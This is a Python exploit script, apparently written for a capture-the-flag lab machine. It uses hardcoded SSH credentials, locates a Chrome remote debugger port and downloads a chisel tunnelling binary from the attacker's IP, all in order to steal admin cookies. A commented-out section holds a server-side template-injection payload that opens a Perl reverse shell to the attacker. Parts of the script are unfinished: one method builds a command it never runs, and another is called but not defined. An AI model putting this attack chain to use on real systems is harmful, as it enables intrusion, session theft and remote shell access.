import sys
import site

import argparse
import requests
from urllib.parse import urlencode
from pwn import *
import threading 
import logging 
import json 


# From exploit-tool-box
from  malay_toolbox import MalaySSHClient, run_ssh_interactive_shell, Channel, SSHClient, setup_local_chisel_server, parse_netstat_output


logging.basicConfig(level=logging.DEBUG)  # Set the minimum logging level
logging.getLogger("paramiko").setLevel(logging.WARNING)


class Exploit: 
    def __init__(self):
        self.target_ip = "10.10.11.32"
        self.attacker_ip = "10.10.14.159"
        self.ssh_creds = {
            "username": "michael",
            "password": "insaneclownposse"
        }
        self.chisel_fingerprint = ""
        self.serve_chisel_elf_port = "12345"
        
        self.ssh_client = MalaySSHClient(self.target_ip, self.ssh_creds["username"], self.ssh_creds["password"])
        

    def exploit(self):
        self.chisel_fingerprint = setup_local_chisel_server()
        self.ssh_client.connect_with_ssh(self._actions_over_ssh)


    def _actions_over_ssh(self, channel: Channel, _: SSHClient):
        
        webSocketDebuggerUrl, port  = self.get_chrome_debugger_info()
        
        self.serve_chisel_binary()
        
        run_ssh_interactive_shell(channel, _)
        
        self.tunnel_port(port)
        
        cookie = self.steal_chrome_cookies(webSocketDebuggerUrl)
        
        logging.info("Trying using admin cookies ")
        
        return
    
    
    def get_chrome_debugger_info(self):
        result = self.ssh_client.execute_command("netstat -nlt")
        
        for listener in parse_netstat_output(result):
            try:
                port = listener["port"]
                command = f'wget -qO- http://127.0.0.1:{port}/json'
                
                output = self.ssh_client.execute_command(command, timeout=3)
                webSocketDebuggerUrl = self.parse_debugger_port(output)
                
                return  webSocketDebuggerUrl, port 
            except:
                pass    
        
        raise Exception("Couldnt find chrome debugger port")
    
    def parse_debugger_port(self, text: str) -> str:
        parsed = json.loads(text)
        
        if isinstance(parsed, list):
            for item in parsed:
                try:
                    debugger_url = item["webSocketDebuggerUrl"]
                    
                    if debugger_url:
                        logging.info(f"Found chrome debugger url {json.dumps(item, indent=4)} ")
                        return debugger_url
                      
                except:
                    pass
                
        raise Exception("Couldnt parse ")
    
    def serve_chisel_binary(self):                
        
        logging.info(f"serving chisel binary on {self.serve_chisel_elf_port}")
        # pipe server fd's to current.
        process = subprocess.Popen(f"python -m http.server {self.serve_chisel_elf_port}".split(' '), stdout=sys.stdout, stderr=sys.stdout, preexec_fn=os.setsid)

    def tunnel_port(self, channel: Channel):
        command = f"""
                attacker_ip=\"{self.attacker_ip}\";
                cd /tmp ; 
                wget "http://$attacker_ip:1234"/chisel ;
                chmod +x chisel ;
                ./chisel client --fingerprint  B4AXZzTbFbkA+unH4ejgqCkKE9NC1N9eWc7nJbF2lHU= "$attacker_ip:8080"  R:6999:127.0.0.1:8080 & "
        """
        return 
    
# def connect_with_ssh():

# def api_signin(session, url, email, password):
#     endpoint = f"{url}/api/signin"
#     headers = {
#         'Accept': 'application/json',
#         'Accept-Language': 'en-US,en;q=0.5',
#         'Accept-Encoding': 'gzip, deflate, br',
#         'Content-Type': 'application/json',
#         'Origin': url,
#         'Connection': 'keep-alive',
#     }
#     body = {
#         "email": email,
#         "password": password
#     }

#     response = session.post(endpoint, json=body, headers=headers)
#     return response.status_code == 200

# def api_exploit(session, url, lhost, lport):
#     endpoint = f"{url}/api/test-connection"
#     headers = {
#         'Accept': 'application/json',
#         'Accept-Language': 'en-US,en;q=0.5',
#         'Accept-Encoding': 'gzip, deflate, br',
#         'Content-Type': 'application/json',
#         'Origin': url,
#         'Connection': 'keep-alive',
#     }
#     payload = f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
#     body = {
#         "name": f"{{{{ process.mainModule.require('child_process').exec(decodeURIComponent('{urlencode(payload)}')) }}}}",
#         "driver": "mysql"
#     }

#     response = session.post(endpoint, json=body, headers=headers)
#     return response.status_code == 400 and "ECONNREFUSED" in response.text

# def start_listener(lhost, lport):
#     listener = listen(lport, bindaddr=lhost)
#     listener.wait_for_connection()
#     listener.interactive()



Exploit().exploit()